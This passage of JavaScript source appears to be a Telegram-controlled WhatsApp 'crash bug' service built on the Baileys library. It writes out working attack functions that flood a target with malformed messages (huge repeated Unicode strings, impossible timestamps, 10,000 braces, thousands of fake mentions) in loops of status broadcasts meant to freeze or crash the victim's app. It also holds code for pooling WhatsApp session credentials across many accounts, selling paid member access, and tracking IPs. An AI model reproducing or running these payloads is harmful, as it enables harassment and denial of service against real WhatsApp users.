              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
              caption: "‼️⃟ ༚ ./rãldzavgrs.   " + triggerUI,
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          },
          mentionedJid: [
            target,
            "0@s.whatsapp.net",
            "13135550002@s.whatsapp.net",
            ...Array.from(
            { length: 1990 },
            () =>
            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
              ],
          stanzaId: client.generateMessageTag(),
          virtexId: client.generateMessageTag(),
          quotedMessage: {
            paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: -99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999e999999999999999999999999999999999999999999999999999999999999999 * 999999999999999999999999999999999999999999999999999999999e99999999999
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
};

async function iosTrashLocExtend(sock, target) {
const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿".repeat(60000); 
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://whatsappx-ios.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }

      let extendMsg = {
         extendedTextMessage: { 
            text: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + TrashIosx, 
            matchedText: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰr4Ldz`impõssible. ✩",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      for (let i = 0; i < 100; i++) {
      await sleep(1000);
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msgx.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      }
   } catch (err) {
      console.error(err);
   }
};

async function iOSxTend(sock, target) {
  const etc = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "💤‼️⃟⃰ᰧ./### ✩ > https://Wa.me/stickerpack/RaldzzXyz" + "𑇂𑆵𑆴𑆿".repeat(15000),
        matchedText: "https://Wa.me/stickerpack/RaldzzXyz",
        description:
          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        title:
          "💤‼️⃟⃰ᰧ./### ✩" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, etc.message, {
    messageId: etc.key.id,
  });
}

const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};
const mess = {};

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          // ✅ HEARTBEAT: catat sesi ini sebagai Active Connection
          try {
            const ownerFolder = path.basename(path.dirname(folderPath));
            startSessionHeartbeat(sessionName, ownerFolder, type || 'sender');
          } catch(e) { console.error('[HB] startSessionHeartbeat error:', e.message); }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          // ✅ HEARTBEAT: hapus sesi dari Active Connections
          try { stopSessionHeartbeat(sessionName); } catch(e) {}

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}
async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    connectSession(sessionFolder, baseName);
  }
}

async function refreshUserSessions() {
  await startUserSessions();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
      return false;
  }
  const sessionDir = path.join('permenmd', owner, number); 

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
        // ✅ HEARTBEAT: hapus dari active connections saat logout
        try { stopSessionHeartbeat(number); } catch(e) {}
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      // ✅ HEARTBEAT: catat nomor ini sebagai Active Connection
      try { startSessionHeartbeat(number, owner, 'sender'); } catch(e) { console.error('[HB] error:', e.message); }
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

try {
  await waiting(3000)
  if (fs.existsSync(sourceCreds)) {
    const data = fs.readFileSync(sourceCreds);
    fs.writeFileSync(destCreds, data);
    console.log(`✅ Rewrote session to ${destCreds}`);
  }
} catch (e) {
  console.error(`❌ Failed to rewrite creds: ${e.message}`);
}
    }
  });

  return null;
}

async function startUserSessions() {
  const subfolders = fs.readdirSync('permenmd')
    .map(name => path.join('permenmd', name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
        continue;
      }

      try {
        console.log(`[START] Connecting session: ${sessionName}`);
        await connectSession(folder, sessionName);
      } catch (err) {
        console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
      }
    }
  }
}

function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName];
    }
  }
  return null;
}

const telegramDataPath = "telegram.json";
const dbPath = "database.json";

function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

// ============ FUNCTION IS EXPIRED ============
function isExpired(user) {
    if (!user || !user.expiredDate) return true;
    const expired = new Date(user.expiredDate) < new Date();
    console.log(`[⏳ EXP] ${user.username} expired:`, expired);
    return expired;
}

// ============ COOLDOWN OBJECTS ============
const spamCooldown = {};
const cooldowns = {};

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...(isOwner ? [[
          { text: "📋 List User", callback_data: "list_user" },
          { text: "🎛 Buat Custom User", callback_data: "create_custom" },
          { text: "🗑 Hapus User", callback_data: "delete_user" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now();
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.")
  await refreshUserSessions()
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
})

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "lu ngapain");
  }

  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  const onlineMess = connectedMess || [];
  const onlineBiz = connectedBiz || [];
  const onlineNumbers = connectedNumbers || [];

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += onlineMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nBusiness Session:\n';
  message += onlineBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nActive Numbers:\n';
  message += onlineNumbers.length > 0
    ? connectedNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://localhost:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const text = `*DarkVerse Server Status*

*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *Darkness-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();
  
  if (msg.from.id !== OWNER_ID) {
